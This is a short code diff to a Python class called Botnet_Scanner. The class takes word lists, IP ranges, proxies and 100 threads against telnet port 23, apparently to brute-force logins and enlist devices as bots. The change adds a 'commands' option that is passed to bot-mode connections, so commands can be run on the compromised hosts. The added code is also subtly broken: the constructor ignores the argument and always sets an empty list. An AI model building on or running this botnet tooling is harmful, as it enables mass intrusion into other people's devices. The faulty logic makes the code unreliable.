@@ -25,6 +25,7 @@ class Botnet_Scanner:
         logs=True,
         threads=100,
         word_list=[],
+        commands=[],
         ip_range=None,
         timeout=7,
         p=23,
@@ -37,6 +38,7 @@ class Botnet_Scanner:
             self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
         self.word_list=Userful_Utilities.load_word_list(word_list)
         self.logs = logs
+        self.commands=[]
         self.protocol = protocol.lower()
         self.stop = False
         self.ip_range = ip_range
@@ -132,6 +134,7 @@ class Botnet_Scanner:
                                             timeout=self.timeout,
                                             p=self.port,
                                             bot_mode=True,
+                                            commands=self.commands,
                                             **proxy
                                         )
                                     else:
